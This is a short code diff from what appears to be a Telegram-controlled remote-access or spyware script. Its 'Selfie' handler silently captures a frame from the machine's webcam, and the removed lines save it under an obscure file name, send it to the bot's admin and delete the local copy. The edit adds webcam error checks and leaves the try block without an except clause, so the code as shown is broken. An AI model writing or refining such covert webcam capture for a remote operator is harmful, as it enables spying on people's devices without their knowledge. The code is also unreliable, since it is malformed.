@@ -242,17 +242,19 @@ def Selfie(dp, bot, admin_id):
         try:
             msg = await bot.send_message(admin_id, 'Скажите сссыр, делаем селфи🤳')
             cap = cv2.VideoCapture(0)
-            dr = os.getcwd()
+            
+            if not cap.isOpened():
+                await bot.send_message(admin_id, '❌ Вебкамера не обнаружена!')
+                return
+                
             for i in range(30):
                 cap.read()
             ret, frame = cap.read()
-            cv2.imwrite(dr + '\\4543t353454.png', frame)   
-            cap.release()
-            webcam = open(dr + '\\4543t353454.png','rb')
-            await bot.send_document(admin_id, webcam)
-            os.remove(dr + '\\4543t353454.png')
-        except Exception as e:
-            await bot.send_message(admin_id, e)
+            
+            if not ret:
+                await bot.send_message(admin_id, '❌ Не удалось сделать фото!')
+                cap.release()
+                return
 
 
 def Screamer(dp, bot, admin_id):
